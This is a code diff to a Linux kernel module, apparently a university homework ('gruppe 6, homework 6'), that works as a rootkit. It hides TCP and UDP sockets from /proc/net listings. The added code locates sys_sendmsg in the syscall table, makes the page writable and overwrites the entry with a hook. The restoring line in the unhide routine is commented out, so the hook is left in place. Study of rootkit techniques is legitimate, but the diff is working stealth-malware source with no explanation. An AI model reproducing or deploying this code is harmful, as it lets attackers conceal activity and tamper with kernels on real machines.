@@ -5,6 +5,9 @@
 #include <net/tcp.h>
 #include <net/udp.h>
 #include <net/net_namespace.h>
+#include <linux/socket.h>
+#include <linux/types.h>
+#include <asm/unistd.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
@@ -16,6 +19,10 @@
 typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
 typedef int (*int_filep_voidp_filldir_t) (struct file *, void *, filldir_t);
 typedef int (*fun_int_seq_file_void) (struct seq_file*, void*);
+// type for sys_sendmsg
+typedef asmlinkage long (*fun_long_int_struct_msghdr_unsigned)(int, struct msghdr __user*, unsigned);
+fun_long_int_struct_msghdr_unsigned orig_sendmsg;
+int nr_sys_sendmsg;
 
 fun_ssize_t_int_pvoid_size_t     original_read;
 int_filep_voidp_filldir_t proc_original_readdir;
@@ -61,10 +68,32 @@ static int hooked_tcp_show(struct seq_file* file, void* v){
     return 0;
 }
 
+asmlinkage long hooked_sendmsg(int fd, struct msghdr __user* msg, unsigned flags){
+    OUR_DEBUG("Hooked sendmsg\n");
+    return orig_sendmsg(fd, msg, flags);
+}
+
+int find_syscall(void* addr){
+    void** syscall_table = ptr_sys_call_table;
+    void** ptr_to_sys_call;
+    int i;
+    i = 0;
+    ptr_to_sys_call = ptr_sys_call_table;
+    while((void*)addr - *(void**)ptr_to_sys_call){
+        i++;
+        ptr_to_sys_call++;
+    }
+    return i;
+
+}
+
 void hide_sockets(void){
     struct proc_dir_entry *p = init_net.proc_net->subdir;
     struct tcp_seq_afinfo *tcp_seq = 0;
     struct udp_seq_afinfo *udp_seq = 0;
+    void** syscall_table = ptr_sys_call_table;
+    void** pointer_to_sys_sendmsg;
+    int i;
     while (p){
         if (strcmp(p->name, "tcp")==0){
             tcp_seq = p->data;
@@ -84,12 +113,27 @@ void hide_sockets(void){
         }
         p = p->next;
     }
+    i = 0;
+    pointer_to_sys_sendmsg = syscall_table;
+    OUR_DEBUG("Test: %d, %d\n", __NR_write, find_syscall(ptr_sys_sendmsg));
+    while ((void*)ptr_sys_sendmsg - *(void**)pointer_to_sys_sendmsg){
+        i++;
+        pointer_to_sys_sendmsg++;
+    }
+    nr_sys_sendmsg = i;
+    OUR_DEBUG("Index: %d\n", i);
+    OUR_DEBUG("Found an address: %p => %p\n", pointer_to_sys_sendmsg, syscall_table[i]);
+    orig_sendmsg = (fun_long_int_struct_msghdr_unsigned)*pointer_to_sys_sendmsg;
+    make_page_writable((long unsigned int)pointer_to_sys_sendmsg);
+    syscall_table[i] = hooked_sendmsg;
+    OUR_DEBUG("New contents:     %p => %p\n", pointer_to_sys_sendmsg, syscall_table[i]);
 }
 
 void unhide_sockets(void){
     struct proc_dir_entry *p = init_net.proc_net->subdir;
     struct tcp_seq_afinfo *tcp_seq = 0;
     struct udp_seq_afinfo *udp_seq = 0;
+    void** syscall_table;
     while (p && strcmp(p->name, "tcp")!=0){
         p = p->next;
     }
@@ -105,6 +149,8 @@ void unhide_sockets(void){
         udp_seq = p->data;
         udp_seq->seq_ops.show = udp_show_orig;
     }
+    syscall_table = (void**) ptr_sys_call_table;
+    // syscall_table[nr_sys_sendmsg] = orig_sendmsg;
 }
 
 // helper function to compute log10 of some int, needed for knowing how much mem to allocate
@@ -121,7 +167,7 @@ int log10(int i)
 /* Initialization routine */
 static int __init _init_module(void)
 {
-    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
+    printk(KERN_INFO "This is the kernel module of gruppe 6, homework 6.\n");
     hide_sockets();
 
     return 0;
